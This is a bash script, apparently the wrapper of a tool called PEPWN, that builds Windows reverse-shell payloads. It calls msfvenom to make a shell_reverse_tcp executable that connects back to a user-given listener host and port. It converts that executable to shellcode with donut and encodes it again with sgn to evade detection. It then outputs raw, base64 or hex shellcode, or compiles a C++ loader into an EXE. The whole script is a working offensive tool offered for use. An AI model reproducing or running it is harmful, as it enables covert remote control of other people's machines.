#!/bin/bash

# Author: Abdul Azeez Omar
# File: wrapper.sh
# Purpose: This is a wrapper for the tool. It'll handle all the actions and manages all the chains regarding user options input.


## extended help message that contains all options 
help_message="""
Usage: ./wrapper.sh <OPTIONS>\n
\n
OPTIONS are:\n
\n
-f  :   format/Mode (1 for .exe PE file <DEFAULT> ; 2 for shellcode)\n
\n
-t  :   type of shellcode. 1 for raw data ; 2 for base64encoded data ; 3 for big endian hex encoded string. (only if format is 2 otherwise this will be ignored)\n
\n
-h  :   host/ip/domain of the listener\n
\n
-p  :   port of the listener\n
\n
-H  :   help documentation\n
\n
Example: ./wrapper.sh -f 1 -h 127.0.0.1 -p 4444\n

"""

## the minimal help message to notify the user that something went wrong and suggest to use -H options to see the extended version
minimal_help_message="""
Usage: ./wrapper.sh <OPTIONS>\n
\n
Example: ./wrapper.sh -f 1 -h 127.0.0.1 -p 4444\n
\n
Use -H for help...
"""

let mode=1
let type=0
let shellcode=0
let raw=0 
let base64=0 
let big_end=0
let pe=0

##iterating over all arguments to see if the -H option is present so the extended help messaage will appear

for i in $@ ; do
	if [[ $i == "-H" ]] ; then
		echo -e $help_message && exit 1
	fi
done

## getting all the options present in the command line

while getopts ":f:h:p:t:" arg; do
  case $arg in
    f) mode=$OPTARG;;
	h) ip=$OPTARG;;
	p) port=$OPTARG;;
	t) type=$OPTARG;;
  esac
done

##check if the IP and PORT are provided ; if not the minimal message will apear and the script will exit

if [ -z $ip ] || [ -z $port ]; then 
	echo -e $minimal_help_message && exit 1
fi

## checks on the mode of the output and its type ; if anything missing or wrong an error message will appear alongside the extended help message

if test $mode -eq 2 ; then
	let shellcode=1
	if test $type -eq 1 ; then 
		let raw=1
	elif test $type -eq 2 ; then 
		let base64=1
	elif test $type -eq 3 ; then 

		let big_end=1
	else 
		echo "Missing or wrong type option..." && echo -e $help_message && exit 1
	fi
elif test $mode -eq 1 ; then
	let pe=s1
else 
	echo "Missing or wrong format option.."
	echo -e $help_message && exit 1
fi

## if everything is fine the script will start creating the needed payload

echo "[+] Working on..."

## generate the payload using msfvenom using the provided IP and PORT then extract the shellcode from it using donut project

msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe > ~/PEPWN/shell.exe 2> /dev/null   &&
donut ~/PEPWN/shell.exe -a 2 -o ~/PEPWN/load > /dev/null 


## then a shellcode version is available from the previous commands ; so the script will start looking for options if the user wants the payload to be shellcode or EXE.


if test $shellcode -eq 1 ; then
	if test $raw -eq 1 ; then                #shellcode in raw data
		sgn ~/PEPWN/load > /dev/null  &&     #apply the second layer of encoding using sgn
		mv ~/PEPWN/load.sgn /tmp/res.raw &&  #move the result file to /tmp
		echo "Result saved in /tmp/res.raw"  #echo success message
	
	elif test $base64 -eq 1 ; then           #shellcode in base64 encoded data
		sgn ~/PEPWN/load > /dev/null &&      #apply second encoder
		base64 ~/PEPWN/load.sgn > /tmp/res.base64 &&  #move the result in /tmp
		echo "Result saved in /tmp/res.base64"        #echo success message
	
	else
		sgn ~/PEPWN/load > /dev/null &&      #apply second layer of encoding 
		python ~/PEPWN/src/hex_string.py ~/PEPWN/load.sgn && #call the python script that will transfer the result from raw data to big endian hex string
		rm ~/PEPWN/load.sgn &&               #remove the old file
		echo "Result saved in /tmp/res.hex"  #echo success message
	fi
else
	python ~/PEPWN/src/setup.py /root/PEPWN/load && # if the requested result format is EXE file it'll call setup.py script to prepare the c++ code.
	x86_64-w64-mingw32-clang++ -Wall --pedantic ~/PEPWN/src.cc -o /tmp/res.exe --static -std=c++17 &&  #compile the code generated from the previous command.
	rm ~/PEPWN/src.cc && #remove all the not needed files
	rm ~/PEPWN/ld.c &&
	echo "Result saved in /tmp/res.exe"  #echo success message
fi

rm ~/PEPWN/shell.exe && 
rm ~/PEPWN/load 